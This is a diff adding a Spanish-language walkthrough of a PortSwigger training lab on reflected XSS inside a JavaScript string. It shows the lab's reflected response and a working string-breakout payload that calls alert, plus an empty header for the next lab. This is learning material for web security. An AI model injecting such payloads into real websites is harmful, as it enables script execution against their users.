@@ -418,6 +418,37 @@ Entonces, elaboramos un payload para salir de la etiqueta **<script>** y ejecuta
 
 ## 14. Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
 
+```
+This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.
+```
+
+Como se codifican los caracteres **< >** entonces, lo que haremos será romper la cadena e ingresar nuestro payload.
+
+URL
+
+```
+https://ace71fd51f81802680da0524003700b4.web-security-academy.net/?search=aaa
+```
+
+Respuesta
+
+```
+<script>
+    var searchTerms = 'aaa';
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
+</script>
+```
+
+Entonces diseñamos el siguiente payload.
+
+```
+'-alert(document.domain)-'
+```
+
+![](img40.png)
+
+## 15. Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
+
 
 
 
